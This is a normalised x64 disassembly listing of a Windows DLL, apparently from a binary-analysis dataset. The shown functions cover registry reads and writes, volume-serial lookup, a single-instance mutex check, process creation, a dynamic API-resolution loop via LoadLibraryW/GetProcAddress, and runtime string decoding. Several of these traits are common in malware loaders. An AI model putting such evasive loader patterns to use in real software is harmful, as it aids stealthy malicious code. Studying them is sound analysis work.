mov [ rbp - 0x68 ] rbx
mov [ rbp - 0x78 ] bx
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
cmp [ rbp - 0x38 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18002094c#2
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x50 ]
call j_sub_18002094c#2
nop
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x38 ] bx
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
sub_18001e330
mov r11 rsp
push rbp
push rsi
push rdi
sub rsp 0xb0
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ r11 + 0x20 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov esi r8d
mov rdi rdx
mov rbx rcx
mov [ r11 - 0x60 ] rdx
mov [ r11 - 0x70 ] 0x7
xor ebp ebp
mov [ r11 - 0x78 ] rbp
mov [ rsp + 0x40 ] bp
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x40 ]
call sub_180001ba0
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_18001dd50
mov rbx rax
test rax rax
jne r-xdata
mov [ rsp + 0x70 ] bp
xor eax eax
mov [ rsp + 0x72 ] rax
mov [ rsp + 0x7a ] rax
mov [ rsp + 0x82 ] rax
mov [ rsp + 0x8a ] rax
mov [ rsp + 0x92 ] rax
mov [ rsp + 0x9a ] eax
mov [ rsp + 0x9e ] ax
mov [ rsp + 0x30 ] ebp
mov [ rsp + 0x34 ] 0x4
mov r9d esi
lea r8 [ r--data ]
lea edx [ rax + 0x18 ]
lea rcx [ rsp + 0x70 ]
call sub_180021df4
lea r11 [ rsp + 0x34 ]
mov [ rsp + 0x28 ] r11
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x70 ]
mov rcx rbx
call [ RegQueryValueExW@IAT ]
mov rcx rbx
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
mov ebx [ rsp + 0x30 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
xor eax eax
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov eax ebx
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbp
mov [ rdi ] bp
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xe8 ]
add rsp 0xb0
pop rdi
pop rsi
pop rbp
retn
sub_18001e4a0
mov r11 rsp
push rbp
push rsi
push rdi
sub rsp 0xb0
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ r11 + 0x20 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov esi r8d
mov rdi rdx
mov rbx rcx
mov [ r11 - 0x60 ] rdx
mov [ r11 - 0x70 ] 0x7
xor ebp ebp
mov [ r11 - 0x78 ] rbp
mov [ rsp + 0x40 ] bp
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x40 ]
call sub_180001ba0
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_18001dd50
mov rbx rax
test rax rax
jne r-xdata
mov [ rsp + 0x70 ] bp
xor eax eax
mov [ rsp + 0x72 ] rax
mov [ rsp + 0x7a ] rax
mov [ rsp + 0x82 ] rax
mov [ rsp + 0x8a ] rax
mov [ rsp + 0x92 ] rax
mov [ rsp + 0x9a ] eax
mov [ rsp + 0x9e ] ax
mov r9d esi
lea r8 [ r--data ]
lea edx [ rax + 0x18 ]
lea rcx [ rsp + 0x70 ]
call sub_180021df4
lea r11 [ rsp + 0x30 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] rbp
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x70 ]
mov rcx rbx
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov ecx [ rsp + 0x30 ]
mov edx 0x1
call sub_180021308
mov rsi rax
mov rcx rbx
test rax rax
jne r-xdata
mov rcx rbx
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbp
mov [ rdi ] bp
xor eax eax
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rsi
xor r9d r9d
xor r8d r8d
lea rdx [ rsp + 0x70 ]
call [ RegQueryValueExW@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xe8 ]
add rsp 0xb0
pop rdi
pop rsi
pop rbp
retn
call [ RegCloseKey@IAT ]
mov ecx 0x10
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
call [ RegCloseKey@IAT ]
mov rcx rsi
call sub_18002094c
nop
jmp r-xdata
mov rbx rbp
mov eax [ rsp + 0x30 ]
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rax
jmp r-xdata
mov rcx rdi
call sub_180001820
mov rax rbx
sub_18001e680
push rbx
push rbp
push rsi
push rdi
sub rsp 0xb8
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov esi r9d
mov rdi r8
mov rbx rcx
mov [ rsp + 0x30 ] edx
mov [ rsp + 0x68 ] r8
mov [ rsp + 0x58 ] 0x7
xor ebp ebp
mov [ rsp + 0x50 ] rbp
mov [ rsp + 0x40 ] bp
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rsp + 0x40 ]
call sub_180001ba0
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_18001dec0
mov rbx rax
test rax rax
jne r-xdata
mov [ rsp + 0x70 ] bp
xor eax eax
mov [ rsp + 0x72 ] rax
mov [ rsp + 0x7a ] rax
mov [ rsp + 0x82 ] rax
mov [ rsp + 0x8a ] rax
mov [ rsp + 0x92 ] rax
mov [ rsp + 0x9a ] eax
mov [ rsp + 0x9e ] ax
mov r9d esi
lea r8 [ r--data ]
lea edx [ rax + 0x18 ]
lea rcx [ rsp + 0x70 ]
call sub_180021df4
mov [ rsp + 0x28 ] 0x4
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
xor r8d r8d
lea rdx [ rsp + 0x70 ]
mov rcx rbx
call [ RegSetValueExW@IAT ]
mov rcx rbx
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
xor al al
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov al 0x1
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbp
mov [ rdi ] bp
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xb8
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_18001e7e0
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0xa0
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x98 ] rax
mov ebp r9d
mov rdi r8
mov rsi rdx
mov rbx rcx
mov [ rsp + 0x60 ] r8
mov [ rsp + 0x48 ] 0x7
xor r12d r12d
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x30 ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rsp + 0x30 ]
call sub_180001ba0
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_18001dec0
mov rbx rax
test rax rax
jne r-xdata
mov [ rsp + 0x68 ] r12w
xor eax eax
mov [ rsp + 0x6a ] rax
mov [ rsp + 0x72 ] rax
mov [ rsp + 0x7a ] rax
mov [ rsp + 0x82 ] rax
mov [ rsp + 0x8a ] rax
mov [ rsp + 0x92 ] eax
mov [ rsp + 0x96 ] ax
mov r9d ebp
lea r8 [ r--data ]
lea edx [ rax + 0x18 ]
lea rcx [ rsp + 0x68 ]
call sub_180021df4
mov r11 [ rsi + 0x8 ]
mov rax [ rsi ]
mov [ rsp + 0x28 ] r11d
mov [ rsp + 0x20 ] rax
mov r9d 0x3
xor r8d r8d
lea rdx [ rsp + 0x68 ]
mov rcx rbx
call [ RegSetValueExW@IAT ]
mov rcx rbx
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
jmp r-xdata
xor al al
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov al 0x1
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
mov rcx [ rsp + 0x98 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xa0
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_18001e940
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x158 ]
sub rsp 0x258
mov [ rbp - 0x78 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x148 ] rax
mov [ rsp + 0x40 ] r9
mov [ rsp + 0x50 ] r8
mov r12 rdx
mov rbx rcx
mov [ rbp - 0x80 ] rcx
xor edi edi
mov r15d edi
mov [ rsp + 0x30 ] edi
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x28 ] 0x7
mov [ rcx + 0x20 ] rdi
mov [ rcx + 0x10 ] di
mov [ rcx + 0x50 ] 0x7
mov [ rcx + 0x48 ] rdi
mov [ rcx + 0x38 ] di
lea rsi [ rcx + 0x70 ]
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rdi
mov [ rsi ] di
lea ecx [ rdi + 0x30 ]
call sub_180021000
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x120 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0xf8 ]
mov rcx rdi
call sub_180017bc0
nop
lea rax [ rbp + 0x8 ]
mov [ rsp + 0x30 ] rax
mov [ rbp + 0x20 ] 0x7
xor eax eax
mov [ rbp + 0x18 ] rax
mov [ rbp + 0x8 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xf8 ]
lea rcx [ rbp + 0x8 ]
call sub_180001ba0
nop
mov [ rbp - 0x8 ] 0x7
xor eax eax
mov [ rbp - 0x10 ] rax
mov [ rbp - 0x20 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x120 ]
lea rcx [ rbp - 0x20 ]
call sub_180001ba0
nop
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] ax
lea r9 [ rbp + 0x8 ]
lea r8 [ rbp - 0x20 ]
lea rdx [ rbp + 0x80 ]
mov rcx rbx
call sub_18001d180
nop
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0xa8 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0xd0 ]
mov rcx rdi
call sub_180017bc0
nop
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x70 ] 0x7
xor eax eax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x58 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xd0 ]
lea rcx [ rsp + 0x58 ]
call sub_180001ba0
nop
mov [ rbp - 0x58 ] 0x7
xor eax eax
mov [ rbp - 0x60 ] rax
mov [ rbp - 0x70 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xa8 ]
lea rcx [ rbp - 0x70 ]
call sub_180001ba0
nop
movzx eax [ rw-data ]
mov [ rsp + 0x20 ] ax
lea r9 [ rsp + 0x58 ]
lea r8 [ rbp - 0x70 ]
lea rdx [ rbp + 0x58 ]
mov rcx rbx
call sub_18001d180
nop
test rdi rdi
je r-xdata
mov rcx rax
call sub_180017520
mov rdi rax
test r12 r12
je r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov dil 0x1
mov [ rbp - 0x30 ] 0x7
xor eax eax
mov [ rbp - 0x38 ] rax
mov [ rbp - 0x48 ] ax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rbp - 0x48 ]
call sub_180003930
mov r15d 0x1
cmp [ rbp - 0x38 ] 0x2
jb r-xdata
test dil dil
je r-xdata
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
xor dil dil
jmp r-xdata
mov [ rbp + 0x20 ] 0x7
xor r15d r15d
mov [ rbp + 0x18 ] r15
mov [ rbp + 0x8 ] r15w
lea r8d [ r15 + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x8 ]
call sub_180003930
nop
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x48 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rbp - 0x48 ]
call sub_180003930
nop
lea r8 [ rbp + 0x8 ]
lea rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x20 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x80 ]
mov rdx rax
lea rcx [ rbp + 0x30 ]
call sub_180008960
nop
mov rdx rax
lea rcx [ rbx + 0x10 ]
call sub_180003cb0
nop
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x80 ]
lea rcx [ rbx + 0x10 ]
call sub_180001ba0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x58 ]
lea rcx [ rbx + 0x38 ]
call sub_180001ba0
xor r15d r15d
jmp r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_18002094c#2
test r15b 0x1
je r-xdata
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] r15
mov [ rbp + 0x30 ] r15w
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_18002094c#2
mov [ rbx + 0x60 ] r15
mov [ rbx + 0x68 ] r15
mov [ rsi + 0x10 ] r15
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] r15
mov [ rbp - 0x20 ] r15w
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_18002094c#2
mov [ rsi ] r15w
mov rax [ rsp + 0x40 ]
movups xmm0 [ rax ]
movaps [ rsp + 0x40 ] xmm0
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] r15
mov [ rbp - 0x20 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdx [ rsp + 0x50 ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x20 ]
call sub_180003930
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x20 ]
mov rcx rbx
call sub_18001e0a0
nop
cmp [ rbp + 0x70 ] 0x8
jb r-xdata
mov rsi [ rsi ]
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x48 ] r15w
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_18002094c#2
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] r15
mov [ rbp + 0x58 ] r15w
cmp [ rbp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x58 ]
call j_sub_18002094c#2
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] r15
mov [ rbp + 0x8 ] r15w
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp + 0x8 ]
call sub_180003930
nop
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x48 ] r15w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r12
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r12
lea rcx [ rbp - 0x48 ]
call sub_180003930
nop
lea r8 [ rbp + 0x8 ]
lea rdx [ rbp - 0x48 ]
lea rcx [ rbp + 0x30 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x58 ]
mov rdx rax
lea rcx [ rbp - 0x20 ]
call sub_180008960
nop
mov rdx rax
lea rcx [ rbx + 0x38 ]
call sub_180003cb0
nop
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x8 ]
call j_sub_18002094c#2
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] r15
mov [ rbp + 0xd0 ] r15w
cmp [ rbp + 0xc0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xd0 ]
call j_sub_18002094c#2
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] r15
mov [ rbp - 0x20 ] r15w
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_18002094c#2
mov [ rbp + 0xc0 ] 0x7
mov [ rbp + 0xb8 ] r15
mov [ rbp + 0xa8 ] r15w
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18002094c#2
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] r15
mov [ rbp + 0x30 ] r15w
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_18002094c#2
mov [ rbp + 0x98 ] 0x7
mov [ rbp + 0x90 ] r15
mov [ rbp + 0x80 ] r15w
cmp [ rbp + 0x110 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_18002094c#2
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x48 ] r15w
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_18002094c#2
mov [ rbp + 0x110 ] 0x7
mov [ rbp + 0x108 ] r15
mov [ rbp + 0xf8 ] r15w
cmp [ rbp + 0x138 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf8 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x8 ]
call j_sub_18002094c#2
mov rax rbx
mov rcx [ rbp + 0x148 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x258
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x120 ]
call j_sub_18002094c#2
nop
jmp r-xdata
sub_18001efe0
push rbx
sub rsp 0x270
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x260 ] rax
lea rcx [ rsp + 0x52 ]
xor ebx ebx
xor edx edx
mov r8d 0x206
mov [ rsp + 0x50 ] bx
call sub_180021150
mov [ rsp + 0x38 ] ebx
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x50 ]
mov r8d 0x208
xor ecx ecx
mov [ rsp + 0x20 ] rax
call [ GetVolumeInformationW@IAT ]
test eax eax
jne r-xdata
mov eax [ rsp + 0x40 ]
or rax 0xffffffffffffffff
jmp r-xdata
mov rcx [ rsp + 0x260 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x270
pop rbx
retn
sub_18001f070
push rbx
sub rsp 0x20
mov rbx rcx
mov r8 rdx
mov edx 0x1
xor ecx ecx
call [ CreateMutexW@IAT ]
mov [ rbx + 0x8 ] rax
call [ GetLastError@IAT ]
cmp eax 0xb7
setne al
add rsp 0x20
pop rbx
retn
sub_18001f0b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x100
mov rdi rdx
mov esi 0x104
mov edx 0x2
mov ecx esi
mov rbp r8
call sub_180021308
mov r8d esi
mov rcx rdi
mov rdx rax
mov rbx rax
call [ GetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
mov rdx rsi
lea r8 [ r--data ]
not rcx
dec rcx
sub rdx rcx
mov rcx rbx
call sub_180021e18
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
mov r8 rbp
[ rdi ]
not rcx
dec rcx
sub rsi rcx
mov rcx rbx
mov rdx rsi
call sub_180021e18
mov r8d esi
xor edx edx
mov rcx rbx
call sub_180021150
mov r8 rbp
mov edx esi
mov rcx rbx
call sub_180021ea0
jmp r-xdata
lea rax [ r--data ]
lea rdx [ rsp + 0x128 ]
lea rcx [ rsp + 0xe0 ]
mov r8d 0x3
mov [ rsp + 0x128 ] rax
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rsp + 0xe0 ]
call sub_1800210a4
int3
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
mov rcx rbx
call sub_18002094c
lea r11 [ rsp + 0x100 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
xor edx edx
lea rcx [ rsp + 0x70 ]
lea r8d [ rdx + 0x68 ]
call sub_180021150
xor ecx ecx
xor edx edx
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x78 ] rcx
mov [ rsp + 0x88 ] rcx
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x80 ] rcx
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x98 ] rcx
mov [ rsp + 0x90 ] rcx
mov [ rsp + 0xb8 ] rcx
xor r9d r9d
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x50 ] rdx
mov [ rsp + 0x58 ] rdx
mov [ rsp + 0x60 ] rdx
mov [ rsp + 0x70 ] 0x68
mov [ rsp + 0xac ] 0x101
mov [ rsp + 0x20 ] 0x1
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
sub_18001f290
mov rax rsp
push rdi
sub rsp 0x80
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov [ rw-data ] rcx
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
lea ecx [ rdx + 0x2f ]
call sub_180021000
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov eax 0x1
mov rcx [ rw-data ]
call [ FreeLibrary@IAT ]
xor edi edi
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
mov r8d 0x400
mov rdx rbx
mov rcx rax
call [ GetEnvironmentVariableW@IAT ]
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov edx 0x2
mov ecx 0x400
call sub_180021308
mov rbx rax
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r8d 0x2e
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_18002094c#2
mov rdx rax
mov rcx rbx
call [ lstrcatW@IAT ]
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rax [ rax ]
mov rcx rbx
call [ LoadLibraryW@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
xor ebx ebx
lea rsi [ __dos_header ]
nop
mov edx 0x2
mov ecx 0x400
call sub_180021308
mov rbx rax
mov r8d 0xa
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rax [ rw-data ]
jmp r-xdata
mov r8d 0x400
mov rdx rbx
mov rcx rax
call [ GetEnvironmentVariableW@IAT ]
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rax [ rax ]
mov rdx [ rbx + rsi + 0x4d160 ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov [ rbx + rsi + 0x504a0 ] rax
add rbx 0x8
cmp rbx 0x78
jge r-xdata
test rdi rdi
je r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_18002094c#2
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] 0x0
mov r9 rbx
lea r8 [ sub_18001f540 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
jmp r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
sub_18001f540
mov rax rsp
push r12
sub rsp 0x110
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rdx rcx
lea rcx [ rsp + 0x40 ]
call sub_180006630
nop
mov ecx 0xb0
call sub_180021000
mov [ rsp + 0x128 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov r12d ebx
mov rcx rax
call sub_1800174a0
mov r12 rax
xor ebx ebx
jmp r-xdata
mov rsi rbx
mov rcx rax
call sub_180009120
mov rsi rax
jmp r-xdata
mov ecx 0x80
call sub_180021000
mov [ rsp + 0x128 ] rax
test rax rax
je r-xdata
mov rdi rbx
mov rcx rax
call sub_180011d30
mov rdi rax
jmp r-xdata
mov ecx 0xb0
call sub_180021000
mov [ rsp + 0x128 ] rax
test rax rax
je r-xdata
mov rdx r12
lea rcx [ rsp + 0x40 ]
call sub_180006bd0
mov rdx rsi
lea rcx [ rsp + 0x40 ]
call sub_180003d80
mov rdx rdi
lea rcx [ rsp + 0x40 ]
call sub_180003d80
mov rdx rbx
lea rcx [ rsp + 0x40 ]
call sub_180003d80
nop
lea rcx [ rsp + 0x40 ]
call sub_1800043c0
nop
lea rcx [ rsp + 0x40 ]
call sub_180006980
mov al 0x1
jmp r-xdata
mov rcx rax
call sub_180013920
mov rbx rax
mov ecx 0x98
call sub_180021000
mov [ rsp + 0x128 ] rax
test rax rax
je r-xdata
lea r11 [ rsp + 0x110 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop r12
retn
sub_18001f770
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180020498
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18001f7a8
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x50
mov rdi rdx
movsxd rbx ecx
test rdx rdx
jne r-xdata
mov esi [ rdx ]
mov ebp [ rdx + 0x4 ]
call sub_180022bd8
mov esi [ rax + 0x8 ]
call sub_180022ba0
mov ebp eax
jmp r-xdata
cmp ebx 0x100
jae r-xdata
lea eax [ rbx - 0x41 ]
cmp eax 0x19
ja r-xdata
test esi esi
jne r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
jne r-xdata
mov eax ebx
jmp r-xdata
add ebx 0x20
mov eax ebx
sar rax 0x8
movzx ecx al
mov rax [ rdi + 0x8 ]
movsx edx [ rax + rcx * 2 ]
shr edx 0xf
and edx 0x1
call sub_1800225c4
mov ecx ebx
sar ecx 0x8
movzx ecx cl
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov rax [ rdi + 0x8 ]
